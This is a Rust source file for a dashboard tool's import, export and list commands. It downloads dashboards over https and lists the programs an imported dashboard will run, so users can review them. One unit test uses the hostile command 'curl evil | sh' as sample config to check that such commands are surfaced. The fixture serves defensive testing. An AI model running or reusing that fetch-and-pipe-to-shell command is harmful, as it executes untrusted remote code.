//! Saved dashboards: `dashboard dashboards list`, `dashboard import` and
//! `dashboard export`. See docs/dashboards.md.

use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::Command;

use anyhow::{Context, Result, bail};
use dashboard_config::dashboards::name_for;
use dashboard_config::layers::{Sources, find_project};
use dashboard_config::packages::{Packages, data_dir};
use dashboard_config::{Config, parse};

use crate::runtime::{known_modules, registry};

/// Print the saved dashboards, and the project file if one applies here.
pub fn list(sources: &Sources) -> Result<()> {
    let registry = registry(sources)?;
    let (saved, errors) = registry.list();
    for err in &errors {
        eprintln!("dashboard: warning: {err}");
    }
    println!("{}", registry.dir.display());
    if saved.is_empty() {
        println!("  (none yet: add one with `dashboard import FILE`)");
    }
    let width = saved.iter().map(|s| s.name.len()).max().unwrap_or(0);
    for s in &saved {
        let mark = if sources.dashboard.as_deref() == Some(s.name.as_str()) {
            "*"
        } else {
            " "
        };
        let line = format!(
            "{mark} {:width$}  {}",
            s.name,
            s.description.as_deref().unwrap_or("")
        );
        println!("{}", line.trim_end());
    }
    if let Some(project) = sources.project_from.as_deref().and_then(find_project) {
        let note = if sources.trust().is_ok_and(|t| t.allows(&project)) {
            ""
        } else {
            " (not trusted, not used; see `dashboard trust`)"
        };
        println!("project file: {}{note}", project.display());
    }
    Ok(())
}

/// Save a dashboard from a file or an http(s) URL, then say what it needs.
pub fn import(sources: &Sources, from: &str, name: Option<&str>, force: bool) -> Result<()> {
    if from.starts_with("http://") {
        bail!(
            "only https URLs are downloaded: the file can run programs. Use https, or download it and import the file"
        );
    }
    let text = if is_url(from) {
        fetch(from)?
    } else {
        std::fs::read_to_string(from).with_context(|| format!("reading {from}"))?
    };
    let name = match name {
        Some(n) => n.to_string(),
        None => name_for(last_segment(from)),
    };
    let registry = registry(sources)?;
    let path = registry.save(&name, &text, force)?;
    println!("saved dashboard {name:?} to {}", path.display());

    let config = parse(&text)?;
    let packages = Packages::load_for(&[sources_machine(sources)?, path.clone()]);
    let needs = needs(&config, &packages, &path);
    if needs.is_empty() {
        println!("it needs nothing that isn't here");
    } else {
        println!("it needs:");
        for need in &needs {
            println!("  - {need}");
        }
        if needs.iter().any(|n| n.contains("plugin package")) {
            let dir = data_dir()
                .map(|d| d.display().to_string())
                .unwrap_or_else(|_| "the plugins folder".into());
            println!(
                "There is no `dashboard plugin install` yet. To install a package, put its folder in {dir}/<id>/ (see docs/plugins.md)."
            );
        }
    }
    let runs = commands(&config);
    if !runs.is_empty() {
        println!("Opening it runs these programs; read them first:");
        for line in &runs {
            println!("  {line}");
        }
    }
    println!("{RUNS_NOTE}");
    println!("open it with: dashboard --dashboard {name} serve");
    Ok(())
}

/// Said after the list of commands, which only covers the settings it knows.
pub const RUNS_NOTE: &str =
    "Built-in modules can run other programs too; read the file before you trust it.";

/// What a config's modules run: one line per plugin given by command or by
/// package, and per command set in a built-in's config (cmdrunner's
/// `command`, the program of docker, kubernetes and taskwarrior, and any
/// `token_command`, `url_command` or other `*_command`). Demo views run
/// nothing and are left out.
pub fn commands(config: &Config) -> Vec<String> {
    let mut out = vec![];
    for (id, m) in config.modules.iter().filter(|(_, m)| !m.demo) {
        match (&m.plugin, &m.package) {
            (Some(argv), _) => out.push(format!("{id}: {}", argv.join(" "))),
            (None, Some(name)) => out.push(format!("{id}: plugin package {name}")),
            (None, None) => {
                let builtin = m.builtin.as_deref().unwrap_or(id);
                let key = match builtin {
                    "cmdrunner" => Some("command"),
                    "docker" => Some("docker"),
                    "kubernetes" => Some("kubectl"),
                    "taskwarrior" => Some("task"),
                    _ => None,
                };
                if let Some(value) = key.and_then(|k| m.config.get(k)) {
                    out.push(format!("{id}: {}", command_text(value)));
                }
            }
        }
        named_commands(id, "config", &m.config, &mut out);
    }
    out
}

/// Every `*_command` value in a module's config, at any depth.
fn named_commands(id: &str, at: &str, value: &serde_json::Value, out: &mut Vec<String>) {
    match value {
        serde_json::Value::Object(map) => {
            for (key, v) in map {
                let at = format!("{at}.{key}");
                if key.ends_with("_command") && !v.is_null() {
                    out.push(format!("{id} ({at}): {}", command_text(v)));
                } else {
                    named_commands(id, &at, v, out);
                }
            }
        }
        serde_json::Value::Array(items) => {
            for (i, v) in items.iter().enumerate() {
                named_commands(id, &format!("{at}[{i}]"), v, out);
            }
        }
        _ => {}
    }
}

/// A command as text: a string as-is, an argv joined by spaces.
fn command_text(value: &serde_json::Value) -> String {
    match value {
        serde_json::Value::String(s) => s.clone(),
        serde_json::Value::Array(items) => items
            .iter()
            .map(|v| {
                v.as_str()
                    .map(str::to_string)
                    .unwrap_or_else(|| v.to_string())
            })
            .collect::<Vec<_>>()
            .join(" "),
        other => other.to_string(),
    }
}

/// Write a saved dashboard to `file`, or to stdout.
pub fn export(sources: &Sources, name: &str, file: Option<&Path>, force: bool) -> Result<()> {
    let path = registry(sources)?.find(name)?;
    let bytes = std::fs::read(&path).with_context(|| format!("reading {}", path.display()))?;
    match file {
        None => std::io::stdout().write_all(&bytes)?,
        Some(file) => {
            let result = if force {
                etag_write::write_atomic(file, &bytes)
            } else {
                etag_write::write_cas(file, &bytes, None).map(|_| ())
            };
            match result {
                Ok(()) => eprintln!("wrote {}", file.display()),
                Err(etag_write::WriteError::ExistsWithoutEtag { .. }) => {
                    bail!(
                        "{} already exists; pass --force to replace it",
                        file.display()
                    )
                }
                Err(err) => return Err(err.into()),
            }
        }
    }
    Ok(())
}

fn sources_machine(sources: &Sources) -> Result<PathBuf> {
    match &sources.machine {
        Some(p) => Ok(p.clone()),
        None => dashboard_config::default_path(),
    }
}

/// What a dashboard uses that isn't here: plugin packages that aren't
/// installed, programs not on PATH, and modules this build doesn't have.
/// `path` is where the dashboard is saved; a plugin's relative paths start
/// in its folder.
pub fn needs(config: &Config, packages: &Packages, path: &Path) -> Vec<String> {
    let known = known_modules(config);
    let dir = path.parent().unwrap_or(Path::new(""));
    let mut out = vec![];
    let mut named: Vec<&str> = config.modules.keys().map(String::as_str).collect();
    for screen in &config.screens {
        for tile in &screen.tiles {
            if !named.contains(&tile.module.as_str()) {
                named.push(&tile.module);
            }
        }
    }
    for id in named {
        let m = config.module(id);
        if m.demo {
            continue;
        }
        if let Some(package) = &m.package {
            if packages.get(package).is_none() {
                out.push(format!(
                    "plugin package {package:?} for module {id:?} (not installed)"
                ));
            }
        } else if let Some(program) = m.plugin.as_ref().and_then(|argv| argv.first()) {
            if !program_exists(program, dir) {
                out.push(format!(
                    "program {program:?} for module {id:?} (not found on PATH or next to the dashboard)"
                ));
            }
        } else if !known.iter().any(|k| k == id) {
            out.push(format!(
                "module {id:?}, which this build doesn't have (see docs/modules.md)"
            ));
        } else if let Some(builtin) = &m.builtin
            && dashboard_modules::builtin(builtin).is_none()
        {
            out.push(format!(
                "built-in module {builtin:?} for {id:?}, which this build doesn't have"
            ));
        }
    }
    out
}

/// A program given as a path is looked for from `dir`; a bare name on PATH.
fn program_exists(program: &str, dir: &Path) -> bool {
    let path = Path::new(program);
    if path.components().count() > 1 {
        return dir.join(path).exists();
    }
    let Some(paths) = std::env::var_os("PATH") else {
        return false;
    };
    std::env::split_paths(&paths).any(|d| {
        let candidate = d.join(program);
        candidate.is_file() || (cfg!(windows) && candidate.with_extension("exe").is_file())
    })
}

fn is_url(s: &str) -> bool {
    s.starts_with("https://")
}

/// The file name in a path or URL, without a query.
fn last_segment(s: &str) -> &str {
    let s = s.split(['?', '#']).next().unwrap_or(s);
    s.trim_end_matches('/')
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(s)
}

/// Download with curl, which every supported OS has.
fn fetch(url: &str) -> Result<String> {
    let out = Command::new("curl")
        .args([
            "-fsSL",
            "--max-time",
            "30",
            "--max-filesize",
            "1000000",
            url,
        ])
        .output()
        .context("running curl to download the dashboard")?;
    if !out.status.success() {
        bail!(
            "downloading {url}: {}",
            String::from_utf8_lossy(&out.stderr).trim()
        );
    }
    String::from_utf8(out.stdout).with_context(|| format!("{url} is not UTF-8 text"))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn names_from_paths_and_urls() {
        assert_eq!(name_for(last_segment("dir/My Work.yaml")), "my-work");
        assert_eq!(
            name_for(last_segment("https://example.com/d/on-call.yaml?raw=1")),
            "on-call"
        );
        assert!(is_url("https://example.com/x.yaml"));
        assert!(!is_url("x.yaml"));
        assert!(!is_url("http://example.com/x.yaml"));
    }

    #[test]
    fn lists_what_is_missing() {
        let config = parse(
            "modules:\n  a: { package: nope }\n  b: { plugin: [no-such-program-xyz] }\n  \
             c: { plugin: [./run.sh] }\n  d: { package: nope, demo: true }\n\
             screens:\n  - name: s\n    tiles: [{ module: not-a-module }]\n",
        )
        .unwrap();
        let packages = Packages::load_from(&[]);
        let needs = needs(&config, &packages, Path::new("/nonexistent/x.yaml"));
        assert_eq!(needs.len(), 4, "{needs:?}");
        assert!(needs[0].contains("plugin package \"nope\""));
        assert!(needs[1].contains("no-such-program-xyz"));
        assert!(needs[2].contains("./run.sh"));
        assert!(needs[3].contains("not-a-module"));
    }

    #[test]
    fn lists_commands_built_ins_run() {
        let config = parse(
            "modules:\n  x: { builtin: cmdrunner, config: { command: 'curl evil | sh' } }\n  \
             cmdrunner: { config: { command: uptime } }\n  \
             lin: { builtin: linear, config: { token_command: [op, read, 'op://x'] } }\n  \
             cal: { builtin: calendar, config: { url_command: [pass, cal] } }\n  \
             p: { plugin: [./run.sh, --fast] }\n  \
             d: { builtin: cmdrunner, demo: true, config: { command: ignored } }\n",
        )
        .unwrap();
        let runs = commands(&config);
        assert!(runs.contains(&"x: curl evil | sh".to_string()), "{runs:?}");
        assert!(runs.contains(&"cmdrunner: uptime".to_string()), "{runs:?}");
        assert!(
            runs.contains(&"lin (config.token_command): op read op://x".to_string()),
            "{runs:?}"
        );
        assert!(
            runs.contains(&"cal (config.url_command): pass cal".to_string()),
            "{runs:?}"
        );
        assert!(runs.contains(&"p: ./run.sh --fast".to_string()), "{runs:?}");
        assert_eq!(runs.len(), 5, "{runs:?}");
    }
}
